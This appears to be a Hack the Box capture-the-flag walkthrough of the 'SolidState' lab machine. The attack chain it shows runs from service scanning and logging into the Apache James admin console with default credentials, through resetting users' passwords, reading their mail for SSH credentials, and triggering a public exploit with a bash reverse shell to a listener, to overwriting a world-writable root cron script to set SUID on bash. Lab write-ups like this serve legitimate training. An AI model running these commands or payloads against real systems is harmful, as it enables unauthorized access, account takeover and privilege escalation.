---
source: Hack the Box
title: SolidState
difficulty: medium
tags: Apache James, POP3, File Write
summary: **SolidState**: A vulnerable Apache James server gives the attacker permission to reset user passwords to access their email inbox. One user (a new hire) was given credentials and did not 
update the password which gave the attacker remote access. A python script can be modified/overwritten to execute commands as the root user.
---

## [01] Port Scan and Service Discovery

```term
$ nmap -sC -sV -v -p22,25,80,110,119,4555 -oN scans/nmap_targeted.txt 10.129.65.71

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp?
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.15.236 [10.10.15.236])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
```

## [02] Apache James Vulnerability 

There are some intersting ports listening. Doing some research on port 4555, we can find that port 4555 is commonly used as a 
remote management service for the `Apache James Server`, which allows admins to manage the email server via telnet. We can 
verify Apache James is running by hitting port 4555 with `nc`.

```term
$ nc -vn 10.129.65.71 110
(UNKNOWN) [10.129.65.71] 110 (pop3) open
!!+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
```

We also get a version number, `2.3.2`. Doing research on the service and version, we can find an exploit that also shows 
the default credentials for the Apache James Server as `root:root`. We can attempt to login with these credentials.

```term
$ nc -v 10.129.65.71 4555
solid-state-security.com [10.129.65.71] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
!!Welcome root. HELP for a list of commands
```

And the credentials worked. We also get a `HELP` prompt.
```term
HELP
Currently implemented commands:
help                                    display this help
!!listusers                               display existing accounts
countusers                              display the number of existing accounts
!!adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
!!setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

A few interesting commands here. We are able to list, create, and reset passwords for users. Let's find out what users 
we have and reset their passwords to see if we can get into their mailbox.
```term
listusers
Existing accounts 6
!!user: james
!!user: thomas
!!user: john
!!user: mindy
!!user: mailadmin

setpassword thomas password
!!Password for thomas reset
setpassword john password
!!Password for john reset
setpassword mindy password
!!Password for mindy reset
``` 

## [03] Finding Credentials in User Emails

Now that we have reset the passwords for our suspected users on the machine, let's investigate their mailboxes. `thomas` did not 
show any mail, however, looking at `john` emails, we get a clue.

```term
$ telnet 10.129.65.71 110
Connected to 10.129.65.71.
USER john
PASS+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
+OK
PASS password
!!+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

!!Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

We know `mindy` is a new hire and was given a temporary password. Let's check mindy's mailbox to see if credentials were sent via email.

```term
$ telnet 10.129.65.71 110
Connected to 10.129.65.71.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
!!RETR 1
---snip---
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security.
---snip---

!!RETR 2
---snip---
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

!!username: mindy
!!pass: xxxxxxxx
---snip---
```

Indeed they were. Not only are there credentials, but the email also states `ssh` access to the machine. We can test the credentials now.
```term
$ ssh mindy@solid-state-security.com
The authenticity of host 'solid-state-security.com (10.129.65.71)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
mindy@solid-state-security.com's password:
!!mindy@solidstate:~$ 
```

## [04] Shell as "mindy" and Finding Root Processes

Something strange is going on with the shell, and after a quick look we can see mindy's shell is `rbash`. I found an exploit here `https://www.exploit-db.com/exploits/50347` 
that combines a `path traversal` and `file write` vulnerability. It mentions the payload will be executed once a user logs in via ssh (which we can now do as mindy). 
Back on the attacker machine, let's run the exploit and proc the exploit with the ssh login.

```term
$ python3 james.py 10.129.65.71 10.10.15.236 9001
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/10.10.15.236/9001 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 9001
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 9001 before logging in!
```

Now start listener and proc the exploit.
```term
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.236] from (UNKNOWN) [10.129.65.71] 46308
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
```

Although it shows our shell is still rbash, it appears we have much less restrictions. `pspy` is a great tool to show current and fresh processes running on the machine.
We can use the nc shell to fetch it from our machine and run it on the victim. Although, not long after I downloaded the script, I found it was no longer there. Further 
investigation lead to a script `/opt/tmp.py` that does exactly what fooled me, deleting files under /tmp. The script is also world writable.

```term
$ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l
total 8
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
!!-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

Seems oddly interesting. We can overwrite it with a privilege escalation  payload to see if:
`[1]` Our theory is correct, something (most likely cron) is operating on this script.
`[2]` Since the file is `root` owned, potentially the root user is interacting with it.

It can be annoying trying to edit files on an unstable connection, so using `sed` I can edit the file, output it as a new file, then overwrite the existing tmp.py. 
We have to create a new file because sed creates a temporary file as it edits inline. We have write permission to tmp.py, but we do not have write permission to /opt.

```term
$ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ sed 's|rm -r /tmp/\*|chmod +s /bin/bash|g' tmp.py > /tmp/tmp.py 
```
```term
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat /tmp/tmp.py > tmp.py
```
```term
$ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
!!     os.system('chmod +s /bin/bash ')
except:
     sys.exit()
```

Now we can continue to enumerate the system and see if the `suid` bit flips on bash. After some time passes, listing the permissions on bash shows the suid bit is set.

```term
$ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l /bin/bash
!!-rwsr-sr-x 1 root root 1265272 May 15  2017 /bin/bash
```
```term
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ bash -p
whoami
!!root
```

